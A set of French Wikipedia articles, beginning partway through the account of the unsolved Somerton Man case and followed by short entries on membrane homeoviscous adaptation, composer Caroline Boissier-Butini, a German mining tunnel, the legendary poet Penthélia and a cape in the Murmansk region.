En étudiant le registre de l’arrivée des trains, la police déduit que l’homme a dû arriver par un train de nuit, soit depuis Melbourne, Sydney ou Port Augusta. Elle suppose qu’il a ensuite pris une douche et qu’il s'est rasé dans les bains publics adjacents, avant de revenir à la gare pour acheter un ticket pour le train de 10 h 50 à destination d’Henley Beach, que, pour une raison inconnue, il a raté ou n'a volontairement pas pris. Après être revenu à la gare depuis les bains publics, il a enregistré sa mallette au vestiaire avant de prendre le bus pour Glenelg. Derek Abbott, un professeur de l'Université d'Adélaïde qui a étudié l’affaire, pense que l’homme a pu acheter le billet de train avant de se nettoyer. Trouvant les équipements sanitaires de la gare fermés ce jour-là, il se serait alors dirigé vers la piscine située un peu plus loin pour se nettoyer, ce qui aurait ajouté 30 minutes au temps qu’il pensait mettre pour se laver, expliquant qu’il ait raté le train pour Henley Beach et qu’il ait pris le bus suivant.
L’enquête médico-légale.
L’enquête du médecin légiste, menée par Thomas Erskine Cleland, commença quelques jours après la découverte du corps, puis elle fut ajournée jusqu'au . Il fit appel à son cousin, John Burton Cleland, un pathologiste très réputé qui réexamina le corps et les vêtements de la victime et fit plusieurs découvertes : il découvrit que les chaussures de l’homme étaient remarquablement propres et semblaient avoir été vernies, au lieu de présenter l’aspect qu’elles auraient dû avoir si l'homme s'était promené sur le sable. Il ajouta que cette information allait dans le sens de la théorie selon laquelle le corps de l’homme aurait été apporté sur la plage après sa mort, en accord avec l’absence de traces de vomissures ou de convulsions sur la plage, les deux effets principaux du poison.
Thomas Cleland pensait que si aucun des témoins ne pouvait établir avec certitude de liens entre l’homme qui avait été aperçu le soir et le corps découvert le matin, la possibilité que l’homme ait été tué ailleurs et qu’il ait été déplacé sur la plage était plausible. Il admit cependant qu’il ne s’agissait que de spéculations puisque la plupart des témoins assuraient qu’il s’agissait « définitivement de la même personne », le corps reposant au même endroit et dans la même position caractéristique. Il indiqua aussi qu’il n'avait pu trouver aucune piste sur l’identité de la victime.
Sir John Burton Cleland trouva également un morceau de papier portant l'inscription « Tamam Shud » dans la poche du pantalon de la victime.
Cedric Stanton Hicks, un professeur de physiologie et de pharmacologie à l’université d’Adélaïde appelé à participer à l'enquête, déclara dans son témoignage qu’un certain type de drogue, qu’il indiqua au médecin légiste, pouvait être extrêmement toxique, même dans des petites quantités presque impossibles à détecter, même quand le médecin légiste savait ce qu’il cherchait. Le nom des drogues ne fut pas révélé au grand public avant les années 1980, car il était alors « très facile de s’en procurer, même pour un individu ordinaire » (plus tard, les drogues furent publiquement identifiées comme étant de la digitaline et de l’ouabaïne). Il remarqua que le seul élément manquant pour relier l’affaire à ces drogues était l’absence de trace de vomissures, ce qui l’empêcha de formuler une conclusion définitive. Il déclara que si la mort était survenue, comme l’indiquait l’heure du décès, 7 heures après le dernier mouvement connu de la victime, cela impliquait qu'elle ait ingurgité une dose massive. Le mouvement vu par les témoins à 19 h, ressemblant à un étirement, pouvait, dans ce cas, être l’une des dernières convulsions précédant la mort. Il est à noter que, concernant l'heure du décès, l'estimation a été faite juste après la découverte du cadavre, alors que la thèse d'un empoisonnement n'était pas encore évoquée, et que celui-ci peut modifier très significativement la rigidité cadavérique. Il est donc très probable, s'il s'agit d'un empoisonnement, que l'heure de décès soit erronée.
Plus tôt au cours de l’enquête, Cleland déclara « je ne serais pas surpris de découvrir que l’individu a été victime d’un poison, probablement un glucoside, et que le poison n’a pas été administré accidentellement ; mais je ne peux pas dire s’il a été administré par la victime elle-même ou par une autre personne ». Malgré les indices, il n’a pas pu déterminer la cause de la mort de l’homme de Somerton.
Le manque de succès concernant l’identification du corps et la cause du décès poussa les autorités à déclarer qu’il s’agissait d’un « mystère sans équivalent », et que la cause de la mort ne serait probablement jamais élucidée.
Un éditorialiste parla alors « d’un des plus profonds mystères australiens » en mettant en évidence que, si l’homme était mort à cause d’un poison si rare et inconnu que même les experts en toxicologie étaient incapables de l’identifier, alors les connaissances complexes du coupable en matière de substances toxiques permettaient d’exclure l’idée d’un empoisonnement domestique et d’envisager une affaire autrement sérieuse.
Les Rubaiyat d'Omar Khayyam.
Lors de l'enquête, Sir John Burton Cleland trouva un petit morceau de papier roulé sur lequel étaient imprimés les mots « Tamam Shud », dans une petite poche du pantalon de la victime. Les spécialistes appelés pour traduire les deux mots l'identifièrent comme une phrase signifiant « terminé » ou « fini » en persan, une inscription qu'on peut retrouver sur la dernière page des Rubaiyat d'Omar Khayyam. Le verso du morceau de papier était vierge. La police conduisit alors une enquête à l'échelle nationale pour trouver une édition du livre possédant la même page blanche en fin de volume. Une photographie du morceau de papier fut envoyée aux divisions régionales de la police et diffusée au grand public. Un homme se présenta le et déclara qu'il avait trouvé une version très rare de la première édition traduite en 1859 par Edward Fitzgerald, publiée par Whitcombe and Tombs, en Nouvelle-Zélande, sur le siège arrière de sa voiture, laissée ouverte et garée sur Jetty Road à Gleneg, environ une semaine ou deux avant la découverte du corps. Il ignorait le lien entre le livre et l'affaire jusqu'à ce qu'il lise l'article publié la veille par le journal. Les mots « Tamam Shud » avaient été arrachés du livre et des tests au microscope permirent d'indiquer que le morceau de papier retrouvé sur la victime provenait bien de ce volume. L'identité de cet homme et sa profession furent tenues secrètes par la police, conformément à son souhait.
Le thème principal des Rubaiyat d'Omar Khayyam est que la vie doit être vécue intensément à chaque instant, et qu'il ne faut pas avoir de regret au moment de la mort. Le sujet des poèmes poussa la police à développer la thèse d'un suicide par empoisonnement, bien qu'il n'y ait aucune preuve pour appuyer cette théorie.
Au dos du livre, on trouva des inscriptions réalisées avec un crayon de papier : 5 lignes de lettres en capitales, avec la deuxième ligne barrée. La ligne barrée est aujourd'hui considérée comme partiellement identique à la quatrième ligne, ce qui impliquerait que la personne qui a écrit les lignes se serait trompée, et donc, que les lettres auraient un sens et constitueraient un code.
Sur l'inscription du livre, il est difficile de dire si les deux premières lignes commencent par un M ou par un W, mais on considère généralement qu'il s'agit de W, en s'appuyant sur les différences avec les autres lettres M. On peut aussi discerner un X au-dessus du dernier O, mais on ne sait pas si cette inscription fait partie du code ou non. À l'origine, la police supposa que les lettres formaient des mots dans une langue étrangère avant de réaliser qu'il devait s'agir d'un code. Des experts en décryptage furent appelés pour casser le code, sans succès. Le code fut analysé par le département de la Défense australien qui déclara :
Au dos du livre, la police trouva aussi un numéro de téléphone, inscrit sur liste rouge, appartenant à une ancienne infirmière habitant à Moseley St, Gleneg, à environ au nord de l'endroit où le corps avait été découvert. La femme en question déclara qu'au moment où elle travaillait au Royal North Shore Hospital à Sydney pendant la Seconde Guerre mondiale, elle possédait un exemplaire des Rubaiyat, mais qu'elle l'avait donné en 1945, au Clifton Gardens Hôtel à Sydney, à un lieutenant du nom d'Alfred Boxall qui travaillait à la Section de Transport de l’eau de l'armée australienne.
Selon les médias de l'époque, la femme indiqua qu’elle avait déménagé à Melbourne après la guerre et qu'elle s'était mariée. Elle avait reçu un peu plus tard une lettre provenant d’Alfred Boxall mais elle lui avait indiqué qu'elle était désormais mariée. Elle ajouta qu'à la fin de l'année 1948, un homme mystérieux avait posé des questions sur elle à son voisin. Aucune preuve n'a pu démontrer que Boxall, qui ne savait pas que la femme s'était mariée, ait eu le moindre contact avec elle après 1945. Il apparut par la suite que cette femme n’était en réalité pas mariée, mais qu’elle vivait en concubinage avec un homme qu’elle allait épouser. Elle nia connaître la victime ainsi que la raison pour laquelle cet homme se trouvait à proximité de sa maison la nuit de sa mort. Elle demanda également que son identité ne soit pas enregistrée, car elle déclara qu'elle était mariée (ce qui n'était pas vrai) et voulait éviter l’embarras d'être liée à la victime ou à Boxall, ce que la police accepta. En voyant la reproduction en plâtre du buste de l'homme mort, présentée par le sergent inspecteur Leane, elle fut incapable de l’identifier. Selon Leane, la réaction de la femme en voyant le buste a été « un vif mouvement de recul, donnant l'impression qu'elle était sur le point de s'évanouir ». Dans une interview de 2002, Paul Lawson, le technicien qui a réalisé le buste et qui était présent lorsque celui-ci a été montré à la femme, dit qu'immédiatement après avoir vu le buste, elle a détourné son regard et qu'elle ne l'a plus regardé.
La police a cru que la victime était en réalité Boxall jusqu'à ce que le vrai Boxall ne soit découvert, vivant, en possession de l'édition des Rubaiyat qui lui avait été offerte (une édition de 1924 imprimée à Sydney), les mots « Tamam Shud » toujours présents sur la dernière page. Boxall travaillait alors au service de maintenance du dépôt de bus de Randwick (où il travaillait déjà avant la guerre), et il n'était pas au courant du lien entre lui et la victime. Sur la couverture de l'édition des Rubaiyat qu'elle avait offerte à Boxall, la femme avait écrit le poème LXX :
Dans un programme télévisé consacré à l'affaire, elle est mentionnée sous le nom de « Jestyn », probablement à cause de la signature visible sous le poème qu'elle a inscrit sur la couverture du livre offert à Boxall. Il s'agit probablement d'un surnom affectueux qu'elle utilisait avec Boxall.
Pistes et théories.
Post-enquête.
Après l’enquête, le corps de la victime a été enterré au West Terrace Cemetery d’Adélaïde, où l’Armée du salut a conduit le service funéraire. La South Australian Grandstand Bookmakers Association a payé le service pour éviter que l’homme ne soit enterré dans la fosse commune.
Après l’enterrement, des fleurs ont commencé à apparaitre sur la tombe. La police interrogea une femme qui quittait le cimetière, mais celle-ci déclara qu’elle ne connaissait pas l’homme. À peu près au même moment, la réceptionniste du Strathmore Hôtel, en face de la gare d'Adélaïde, révéla qu’un homme étrange avait logé dans la chambre 21, à peu près à la période de la mort, et qu'il était parti le . Elle se souvint que le personnel d'entretien avait trouvé une sacoche médicale noire et une seringue hypodermique dans la chambre.
Depuis 60 ans, de nombreuses tentatives ont été faites pour craquer le code que contiendrait les lettres trouvées à l'arrière du livre, sans succès, dont des tentatives réalisées par les services de renseignement militaire et ceux de la Marine, des mathématiciens, des astrologues, ainsi que par des craqueurs de code amateurs. En 2004, l'inspecteur à la retraite Gerry Feltus suggéra dans un article du Sunday Mail que la ligne finale « ITTMTSAMSTGAB » pourrait être les initiales de la phrase « It's Time To Move To South Australia Moseley Street... » (Il est temps d'aller dans le sud de l'Australie à Moseley Street), Moseley Street étant la rue dans laquelle habitait « Jestyn », la rue principale de Glenelg. Une analyse réalisée en 2014 par un linguiste assisté par ordinateur, John Rehling, suggère que les lettres formeraient les initiales d'un texte en anglais, mais il n'a pas pu trouver de correspondance dans un large panel littéraire, et il en conclut que les lettres seraient certainement une sorte d'aide-mémoire, pas un code, et que le texte original ne pourrait probablement jamais être retrouvé.
L’Australian Broadcasting Corporation, dans sa série documentaire « Inside Story », a produit un programme en 1978 sur l'affaire Taman Shud, intitulée "Le Mystère de la plage de Somerton", dans lequel le journaliste Stuart Littlemore enquête sur l'affaire et interviewe Boxall qui n'ajoute pas de nouvelles informations, ainsi que Paul Lawson, qui a réalisé le buste en plâtre et qui refuse de dire si quelqu'un a identifié le corps.
En 1994, John Harber Phillips, juge en chef de l’État de Victoria et président de l’institut de médecine légale de Victoria, a réétudié l'affaire pour déterminer les causes de la mort, et il conclut que l’utilisation de digitaline fait peu de doute. Phillips appuie sa conclusion en soulignant l'engorgement des organes, compatible avec l'effet de la digitaline, le manque d'éléments indiquant une maladie naturelle et « l'absence de quoi que ce soit de visible à l’œil nu qui puisse expliquer la mort ». Trois mois avant la mort de l'homme de Somerton, le , la digitaline avait été mise en cause dans la mort du secrétaire adjoint au Trésor Américain, Harry Dexter White. Il avait été accusé d'espionnage soviétique pendant l'opération Venona.
L'affaire est toujours considérée comme « ouverte » au sein du département des homicides de la police d’Australie du Sud. La société historique de la police d’Australie du Sud détient le buste, qui contient des mèches de cheveux de la victime. Toutes les autres tentatives pour identifier le corps ont été entravées par le formol utilisé lors de l'embaumement qui a détruit la plupart des traces d'ADN. D'autres éléments clés ont disparu, comme la mallette, qui a été détruite en 1986. Les déclarations des témoins ont été perdues au fil des années.
Théorie de l’espionnage.
Des rumeurs commencèrent à circuler concernant l’implication de Boxall dans l’espionnage militaire pendant la guerre, ce qui s’ajouta aux spéculations qui faisait de l’homme de Somerton un espion soviétique empoisonné par des ennemis inconnus. En réalité, Alfred Boxall était ingénieur dans la Section de Transport de l’eau de l'armée australienne, détaché à la 2/1st North Australia Observer Unit (NAOU) pour des opérations spéciales sous le commandement direct d’un officier général. Pendant ce détachement, il passa du rang de caporal suppléant à celui de lieutenant en trois mois (soit une promotion de 8 rangs).
La théorie de l’espionnage soviétique est renforcée par le lieu de la découverte du corps, près d’Adélaïde, la capitale la plus proche de Woomera, un site top-secret servant de base de lancement de missiles et de centre de renseignement. S’ajoute à cela que l’une des villes depuis laquelle l’homme de Somerton est susceptible d’être arrivé en train à Adélaïde est Port Augusta, une ville relativement proche de Woomera.
De plus, en , le US Army Signals Intelligence Service (service de renseignement américain), dans le cadre du Projet Venona, avait découvert que du matériel top-secret avait fuité depuis le ministère des Affaires étrangères australien vers l’ambassade soviétique à Canberra, ce qui avait mené l’armée américaine à annuler tous les transferts d’informations confidentielles à l’Australie. En réponse, le gouvernement australien avait annoncé la création d’un service de sécurité des secrets nationaux, qui deviendra plus tard l’Australian Security Intelligence Organisation (ASIO).
Affaires possiblement liées.
L'affaire Mangnoson.
Le , le corps d'un enfant de deux ans, Clive Mangnoson, a été trouvé dans un sac au niveau des collines de sable de Largs Bay, environ au sud en longeant la côte depuis Somerton. Son père, Keith Waldemar Mangnoson, était étendu à ses côtés, inconscient. Le père fut amené à l’hôpital dans un très grand état de faiblesse, puis transféré dans un hôpital psychiatrique. Les Mangnoson avaient disparu depuis 4 jours. Selon la police, Clive était mort depuis 24 heures quand son corps a été retrouvé. Ils ont été trouvés par Neil McRae, de Largs Bay, qui prétend qu'il a vu le lieu où étaient les corps au cours d'un rêve, la nuit précédente.
Le médecin légiste n'a pas pu déterminer la cause de la mort de Clive Mangnoson, bien qu'il ne pense pas qu'il puisse s'agir de causes naturelles. L'estomac du garçon fut envoyé à un analyste du gouvernement pour un examen plus complet.
Après la mort, la mère de l'enfant, Roma Mangnoson, indiqua qu'elle avait été menacée par un homme masqué, qui avait essayé de la renverser avec sa voiture alors qu'elle sortait de chez elle, sur Cheapside Street à Largs North. Roma Mangnoson déclara que la voiture s'était arrêtée, et qu’un homme dont le visage était camouflé par un mouchoir kaki lui avait dit de « laisser la police en dehors de ça ». Un homme ayant la même apparence avait récemment été vu, fouinant autour de la maison. Roma Mangnoson pensait que l'incident était relié à la tentative de son mari d'identifier l'homme de Somerton. Selon son mari, l’homme de Somerton pouvait être Carl Thompsen, qui avait travaillé avec lui à Renmark en 1939.
J. M. Gower, secrétaire de la Largs North Progress Association, reçut un appel anonyme menaçant de représailles s'il se mêlait de l'incident, alors qu'A. H. Curtis, le maire de Port Adélaïde, reçut quant à lui 3 appels lui prédisant « un accident » s'il « fourrait son nez dans l'affaire Mangnoson ». La police pensa qu'il pouvait s'agir de canulars et que l'interlocuteur pouvait être la même personne qui avait déjà terrorisé une femme de la banlieue proche qui venait de perdre son mari dans des circonstances tragiques.
L'affaire Marshall.
En , trois ans avant la mort de l'homme de Somerton, un Singapourien de 34 ans du nom de Joseph Saul Haim Marshall fut retrouvé mort dans Ashton Park, Mosman, Sydney, avec un exemplaire des Rubaiyat d'Omar Khayyam sur la poitrine. On pense qu'il se serait suicidé en s'empoisonnant. L'exemplaire de Marshall des Rubaiyat a été enregistré comme étant de la publiée à Londres par Methuen. En 2010, une enquête a révélé que Methuen n'avait publié que 5 éditions ; cette incohérence n'a jamais été expliquée et a été rapprochée de la difficulté à s'approprier un exemplaire de l'édition de Whitcombe and Thombs.
« Jestyn » a donné à Alfred Boxall un exemplaire des Rubaiyat à Clifton Gardens, deux mois après la mort de Marshall. Clifton Garden se situe juste à côté d'Ashton Park. Joseph Marshall était le frère du célèbre avocat et Premier Ministre de Singapour, David Saul Marshall. Une enquête fut menée concernant la mort de Joseph Marshall le . Une femme du nom de Gwenneth Dorothy Graham témoigna au cours de l'enquête et fut retrouvée morte 13 jours plus tard, dans une baignoire, les poignets ouverts.
Développements récents.
Enquêtes en cours.
Depuis , une équipe de l'Université d'Adélaïde, menée par le professeur Derek Abbott, essaye de résoudre l'affaire en craquant le code et propose d’exhumer le corps pour réaliser des tests ADN.
L'enquête d'Abbott amène à remettre en cause certaines des hypothèses que la police avait faites sur l'affaire. La police pensait que la différence entre la marque de cigarette du paquet et celle des cigarettes retrouvées à l’intérieur était due à la pratique, courante à l'époque, d'acheter des cigarettes de moindre qualité et de les mettre dans un paquet d'une marque plus chère. Cependant, une vérification dans la gazette du gouvernement de ce jour-là (les produits en Australie étaient encore rationnés) indique que Kensitas était la marque la plus chère, ce qui permet de penser que les cigarettes auraient pu contenir le poison et qu'elles aient été échangées sans que l'homme ne le sache, une piste qui n'a jamais été suivie. Abbott a également fouillé la piste du carton de fil Barbour et il a trouvé des variations dans les emballages, ce qui pourrait fournir un indice sur le pays dans lequel il a été acheté.
Le craquage du « code » a été repris à zéro. Les statistiques ont déterminé que la fréquence de la distribution des lettres est différente de celle de lettres distribuées aléatoirement ; la fréquence doit encore être testée pour savoir si le peut influer sur la distribution aléatoire d'une série de lettres.
Les rapports d'autopsie de l'homme de Somerton de 1948 et 1949 ont été perdus et la Barr Smith Library de Cleland ne contient aucune note concernant l'affaire. Macieh Henneberg, professeur d'anatomie à l'Université d'Adélaïde, a examiné l'oreille de l'homme de Somerton et déterminé que la conque est plus grande que la fossette naviculaire, une particularité qu'on ne retrouve que chez 1 à 2 % de la population de type caucasienne. En , Derek Abbott a consulté un expert dentaire qui a conclu que l'homme de Somerton était atteint d'hypodontie au niveau des deux incisives latérales, une particularité génétique rare présente chez 2 % de la population mondiale. En , Abbott a obtenu une photographie du fils de Jestyn, Robin, qui montre clairement ses oreilles et ses dents. On peut voir sur la photographie qu'en plus d'avoir une conque plus grande que la fossette naviculaire, il est également atteint d'hypodontie. Les chances pour qu'il s'agisse d'une coïncidence ont été estimées entre 1 sur et 1 sur .
Les médias ont suggéré que le fils de « Jestyn », qui avait 16 mois en 1948 et qui est mort en 2009, pourrait être le fils de Boxall ou de l'homme de Somerton et qu'il aurait été confié au mari de « Jestyn ». Une analyse ADN permettrait d'infirmer ou de valider cette théorie. Abbott pense que l'exhumation et des tests génétiques permettraient de lier l'homme de Somerton à une liste de noms de famille, qui, associés aux autres indices, pourraient être la clef de son identification. Cependant, en 2011, le procureur général John Rau a refusé la permission d'exhumer, déclarant : « Il faut une raison d'intérêt public qui dépasse la curiosité et l'intérêt scientifique ».
Interviews.
En 2013, des membres de la famille de « Jestyn » et de Prosper Thomson ont donné une série d’interviews à la télévision, pour le programme 60 Minutes qui a été diffusé le . Dans ce programme, Kate Thomson, la fille de « Jestyn » et de Prosper Thomson, déclare que sa mère lui aurait dit qu’elle avait menti à la police, qu’elle connaissait l’identité de l’homme de Somerton et que « son identité était aussi connue à un niveau plus élevé ». Kate Thomson suggère aussi que sa mère et l’homme de Somerton ont pu être tous les deux des espions, notant que sa mère était intéressée par le communisme et qu’elle parlait russe couramment, bien qu’elle n’ait pas révélé à sa fille où elle avait appris cette langue, ni pour quelle raison.
La veuve de Robin Thomson, Roma Egan, et leur fille, Rachel Egan, apparaissent aussi dans l’émission 60 Minutes et suggèrent que l’homme de Somerton pourrait être le père de Robin, et donc le grand-père de Rachel. Les Egan déclarent qu’ils ont entamé une procédure auprès du Procureur Général d’Australie du Sud, John Rau, pour que le corps soit exhumé afin de réaliser des tests ADN.
Derek Abbott a lui aussi écrit à John Rau pour appuyer la demande des Egan, indiquant que l’exhumation pour réaliser des tests ADN serait en adéquation à la politique du gouvernement fédéral d’identifier les soldats dans les cimetières militaires, afin de permettre aux familles de terminer leur deuil. Kate Thomson s’oppose à l’exhumation qui, selon elle, serait un manque de respect par rapport à son frère.
H. C. Reynolds.
En 2011, une femme d’Adélaïde a contacté Maciej Henneberg au sujet d’une carte d’identité d’un certain H. C. Reynolds qu’elle avait trouvé dans les affaires de son père. La carte, un document délivré aux États-Unis à un ancien marin pendant la Première Guerre mondiale, a été donnée à l’anthropologiste biologique Maciej Henneberg en afin de réaliser une comparaison avec la photographie de l’homme de Somerton. Bien qu’il ait trouvé des similitudes anatomiques entre le nez, les lèvres ou les yeux, aucune ne fut plus pertinente que celle entre les oreilles sur les deux photographies. La forme des oreilles partagée par les deux hommes correspondait de manière très forte, et Henneberg trouva aussi ce qu’il appelle un « identifiant unique », un grain de beauté sur le front qui avait la même forme et la même position sur les deux photographies.
« Les similitudes entre les oreilles et le grain de beauté me permettent de faire une déclaration qui identifie positivement l’homme de Somerton ».
La carte d’identité, portant le numéro 58757, a été délivrée aux États-Unis le à H. C. Reynolds, qui se déclare Anglais et âgé de 18 ans. Des recherches conduites par le US National Archives, le UK National Archive et le Australian War Memorial Research Center n’ont pas permis de trouver des documents relatifs à H. C. Reynolds. Le département des homicides de la police d’Australie du Sud, pour qui l’affaire est toujours ouverte, étudiera toute nouvelle information.
Charles Webb.
En 2022, la recherche dans une base de données généalogiques à partir de polymorphismes mono-nucléotides (SNP) sur l'ADN prélevé sur des poils pris dans le plâtre du masque mortuaire a permis à l'équipe du Pr Abbott de retrouver quatre personnes vivantes apparentées dont l'arbre généalogique contenait un grand-oncle/cousin au 3ème degré nommé Charles Webb, né en 1905 et de date de décès inconnu. L'épouse de ce Charles Webb avait obtenu en 1952 le divorce pour abandon du domicile conjugal. L'étude des SNP a, par la même occasion, infirmé la parenté entre Charles Webb, maintenant identifié comme l'homme de Somerton, et le fils de Jo Thomson.

</doc>
<doc id="8730016" url="https://fr.wikipedia.org/wiki?curid=8730016" title="Adaptation homéovisqueuse">
Adaptation homéovisqueuse

L'adaptation homéovisqueuse est la modulation de la perméabilité des membranes cellulaires, principalement par "remodelage des lipides membranaires".
Rôle.
La viscosité (l'inverse de la fluidité) d'une membrane cellulaire est un élément d'une importance fondamentale pour la vie et le fonctionnement des cellules.

</doc>
<doc id="8730018" url="https://fr.wikipedia.org/wiki?curid=8730018" title="Caroline Boissier-Butini">
Caroline Boissier-Butini

, née Caroline Louise Butini le à Genève et morte le à Pregny-Chambésy, est une pianiste et compositrice genevoise puis suisse.
Biographie.
Jeunesse.
Caroline Boissier-Butini est née dans une famille de la bourgeoisie genevoise, ses parents sont Pierre Butini et Jeanne-Pernette Bardin. Son père est médecin renommé et grand amateur de musique. Elle commence le piano pendant son adolescence. 
À , elle note dans son journal intime : . À , elle se marie à Auguste Boissier. Elle n'arrête pas l'étude du piano après son mariage et continue de pratiquer intensivement la musique. Son mari est lui-même violoniste amateur et soutient ses activités de pianiste et de compositrice. Le couple a deux enfants : Edmond Boissier en 1810 et Valérie Boissier, future comtesse de Gasparin, en 1813.
Carrière.
À la suite de sa mention dans l"'Allgemeine musikalische Zeitung" de Leipzig le , la réputation de Caroline Boissier-Butini dépasse les frontières de la Suisse. Dans cette chronique, le correspondant du journal relate la facilité inouïe avec laquelle l’artiste joue du pianoforte et interprète un concerto de sa création. Elle apparaît cinq fois à l'affiche de la Société de musique pour présenter ses propres compositions. Elle se produit plusieurs fois dans les concerts de la Société de musique de Genève, notamment pour y jouer ses propres œuvres. Elle compose une grande majorité de pièces purement instrumentales. Elle a aussi été ethnomusicologue, car dans une lettre de 1811, elle décrit comment elle transcrit les chansons qu’une habitante de Valeyres lui a chantées.
Un second moment clé dans la carrière de Caroline Boissier-Butini est le voyage à Paris et Londres en 1818 durant lequel elle mesure son talent pianistique à celui des meilleurs pianistes de ces deux villes. Elle joue notamment devant Marie Bigot, Ferdinand Paër, Friedrich Kalkbrenner et Johann Baptist Cramer. Tous ont loué son savoir-faire de compositrice comme de pianiste. C’est également lors de ce voyage qu’elle cherche à publier certaines de ses œuvres. À la suite du refus d’Ignace Pleyel de les éditer, Caroline Boissier-Butini conclut un contrat avec l’éditeur Leduc, qui ne publie finalement aucune de ses œuvres. Les écrits laissés par Caroline Boissier-Butini soulignent le fait qu’elle avait organisé ce voyage avec des objectifs artistiques et professionnels clairement définis.
En 1818, elle achète pour son père un piano carré à cinq pédales chez le facteur d'instrument Charles Lemmes. C'est la pédale de « janissaire » qui l'aurait inspirée pour son "Concerto pour piano ".
Elle serait l’une des personnalités du monde de la musique les plus douées de sa génération en Suisse. Les talents de compositrice et de pianiste de Caroline Boissier-Butini sont d’autant plus remarquables qu’il n’est fait nulle part mention dans ses écrits personnels de professeur de musique. Cette absence, de même que ses mentions fréquentes de moments d’auto-apprentissage, laissent supposer qu’elle s’est formée de manière autodidacte. Nicolas Bernard Scherer, organiste titulaire de la cathédrale Saint-Pierre de Genève et lui-même compositeur, est un maître envisageable.
Le journal intime que Caroline Butini tient durant les années qui précèdent son mariage nous renseigne sur l’image qu’elle se fait d’une bonne épouse et sur les attentes de la société genevoise. Dans l’emploi du temps d’une bourgeoise genevoise, il n’y a théoriquement pas de place pour une activité créatrice autonome et encore moins pour une pratique intensive de la musique, bien qu'on constate un intérêt progressif pour la musique avec la création du Conservatoire de musique de Genève en 1835. La régularité avec laquelle Caroline Boissier-Butini compose après son mariage est d’autant plus surprenante.
Elle meurt le 9 mars 1836.
Postérité.
Après sa mort, la famille a soigneusement conservé ses compositions et ses écrits personnels (journaux intimes, lettres, autres documents). En 1923, des descendants lui ont procuré une certaine notoriété en éditant, sous le nom de « Madame Auguste Boissier », le compte-rendu des leçons de piano que sa fille reçut de Franz Liszt à Paris en 1832. L’ouvrage, publié sous le titre de « Liszt pédagogue », a connu plusieurs rééditions et traductions. L’étude des œuvres et des activités musicales de Caroline Boissier-Butini jette un coup de projecteur sur une époque de bouleversements politiques, sociétaux et culturels à Genève et en Suisse, encore peu étudiée sous l’angle de la musique.
Œuvres.
Il reste 42 œuvres de Caroline Boissier-Butini, découvertes en 2002 à la bibliothèque de Genève. Lors de ses voyages à Paris elle a essayé de se faire éditer chez Pleyel, sans succès.
Archives.
Le fonds des familles Butini, Boissier, de Gasparin et Barbey est constitué de manuscrits provenant de six générations et comprenant dix-neuf personnes, dont les papiers de la troisième génération des Butini, soit Caroline Butini (1786-1836), qui épousa Auguste Boissier (1784-1857) et Adolphe-Pierre Butini (1792-1877), qui épousa Jeanne-Elisabeth De la Rive (1800-1886). 
Il est conservé à la Bibliothèque de Genève. La consultation est libre à la salle de lecture du Département des manuscrits et des archives privées de la Bibliothèque de Genève.

</doc>
<doc id="8730024" url="https://fr.wikipedia.org/wiki?curid=8730024" title="Galerie profonde (Hercherhof)">
Galerie profonde (Hercherhof)

Le tunnel profond (Tiefer Stollen en allemand), est une galerie dont l'entrée est à Hercherhof près de Fribourg, en Allemagne. Construit pour la , il fait partie du complexe minier du Schauinsland et fournit un accès plus aisé au septième étage du puits de la mine du Roggenberg.
Histoire.
Après l'acquisition des droits miniers par la Stolberger Zink AG en 1935, la construction du tunnel a commencé en 1938 dans le cadre d'un plan économique de quatre ans destiné à préparer l'Allemagne nazie pour la guerre. C'était
le nom de Hermann Göring invoqué dans un litige entre la compagnie minière et l'état agence de protection de l'environnement lorsque l'agence a demandé l'écologisation des déblais.
L'objectif d'une telle construction était de remplacer le téléphérique de minerais assurant leur transport vers Fribourg, puis vers la Stolberg Zink AG à Pforzheim pour un traitement ultérieur. La taille du tunnel de 2,5 m par 2,5 m correspond à l'espace initialement nécessaire pour un transport à cheval. En 1944, ce tunnel atteint une longueur de plus de 3,4 km, grâce au travail des prisonniers de guerre. Le raccordement final à la galerie Léopold a probablement eu lieu en 1946. Ce niveau était utilisé jusqu'en 1954. Dans les années 1960, le tunnel s'est effondré à 720 mètres de l'entrée de la vallée Kappel. Le projet d'extension de la partie nord pour l'exploitation de minerai n'a jamais été achevé, et 300 m restent à être creusés.
Cette construction souterraine fait partie d'une plus grande mine d'argent médiévale dans la montagne Schauinsland près de Fribourg-en-Brisgau, signe des derniers efforts de guerre pour extraire le zinc et le minerai de plomb. Aujourd'hui, le grand complexe minier est utilisé comme site de dépôt de documents historiques d'une part, et comme centre d'aventure pour touristes, étudiants et géologues amateurs d'autre part.

</doc>
<doc id="8730025" url="https://fr.wikipedia.org/wiki?curid=8730025" title="Penthélia">
Penthélia

Penthélia est une poétesse et une prêtresse-musicienne du dieu Ptah qui aurait vécu sous l'Ancien Empire. 
Selon Sophie Drinker, elle aurait décrit les événements de la guerre de Troie dans des chansons et des récits et sa technique du traitement du matériel épique aurait inspiré Homère. Elle symbolise pour la musicologue américaine le double rôle des femmes chargées à la fois d'une fonction religieuse dans les temples et de l'animation des festivités profanes dans les palais.
La féministe américaine Matilda Joslyn Gage, s'appuyant sur "A Dissertation Concerning the War of Troy", publiée en 1796 par le mythographe Jacob Bryant, et extrapolant à partir du premier livre de la "Bibliothèque historique" de Diodore de Sicile, en fait quant à elle l'auteur de l"Iliade" et de l"Odyssée". Selon son affirmation, les poèmes auraient été dérobés par Homère en voyage en Égypte, avec l'aide d'un prêtre félon, dans les archives du temple de Memphis où ils étaient conservés. 
Ces affirmations sont toutefois à prendre avec une grande prudence car le mythographe Jacob Bryant sur lequel s'appuie Matilda Gage écrit son ouvrage à une époque où les hiéroglyphes égyptiens ne sont pas encore déchiffrés (chose faite en 1822 par Jean-François Champollion). Depuis lors, aucune source égyptienne ou grecque ne semble être venue confirmer ou infirmer l'existence réelle de la prêtresse Penthélia, ni, a fortiori, la réalité de l'utilisation ou même de la connaissance par Homère de sa prétendue œuvre poétique. 

</doc>
<doc id="8730038" url="https://fr.wikipedia.org/wiki?curid=8730038" title="Cap Sviatoï Nos (oblast de Mourmansk)">
Cap Sviatoï Nos (oblast de Mourmansk)

